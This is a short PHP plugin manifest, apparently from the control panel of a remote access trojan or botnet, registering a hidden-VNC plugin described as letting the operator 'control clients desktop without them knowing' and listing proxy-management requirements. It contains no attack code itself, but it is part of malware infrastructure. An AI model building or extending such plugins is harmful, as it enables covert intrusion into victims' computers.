<?php
if(!isset($initialized))
{
	include('../../pages/404.php');
}
/*
Requirements:
1. Can host multiple proxies
2. Can apply filters when creating proxy
3. Can view proxy status
4. Can suspende, delete resume proxy for each client or whole set.



*/
$plugin_name = "HVNC";
$plugin_guid = "33f7b140-94ac-4aad-8a31-6076200097d6"; // GUID should be different for diferent versions
$plugin_desc = "Control clients desktop without them knowing!";
$plugin_author = "Parasite";
$plugin_icon = "<i class='fa fa-desktop'></i>"; // Font awesome icons
$plugin_version_str = "1.0.0.0";
$plugin_version_int = 1000;
$plugin_has_dll = true;
?>